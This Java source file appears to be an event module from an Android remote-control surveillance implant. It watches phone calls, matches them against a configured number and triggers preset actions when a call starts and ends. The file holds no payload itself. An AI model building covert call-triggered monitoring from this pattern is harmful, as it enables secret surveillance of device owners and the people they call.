package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Call;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerCall;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.WChar;

public class CallEvent extends EventBase implements Observer<Call> {
		/** The Constant TAG. */
		private static final String TAG = "CallEvent";

		private int actionOnExit, actionOnEnter;
		private String number;
		private boolean inCall = false;
		
		@Override
		public void begin() {
			ListenerCall.self().attach(this);
		}

		@Override
		public void end() {
			ListenerCall.self().detach(this);
		}

		@Override
		public boolean parse(EventConf event) {
			super.setEvent(event);

			final byte[] conf = event.getParams();

			final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
			
			try {
				actionOnEnter = event.getAction();
				actionOnExit = databuffer.readInt();
				
				// Estraiamo il numero di telefono
				byte[] num = new byte[databuffer.readInt()];
				databuffer.read(num);
				
				number = WChar.getString(num, true);
				
				num = null;
				Log.d("QZ", TAG + " exitAction: " + actionOnExit + " number: \"");
			} catch (final IOException e) {
				Log.d("QZ", TAG + " Error: params FAILED");
				return false;
			}
			
			return true;
		}

		@Override
		public void go() {
			// TODO Auto-generated method stub
		}

		public void notification(Call c) {
			// Nel range
			if (c.isOngoing() && inCall == false) {
				// Match any number
				if (number.length() == 0) {
					inCall = true;
					onEnter();
					return;
				}
				
				// Match a specific number
				if (c.getNumber().contains(number)) {
					inCall = true;
					onEnter();
					return;
				}
				
				return;
			} 
			
			if (c.isOngoing() == false && inCall == true) {
				inCall = false;
				
				onExit();
				return;
			}
		}
		
		public void onEnter() {
			trigger(actionOnEnter);
		}

		public void onExit() {
			trigger(actionOnExit);
		}
}
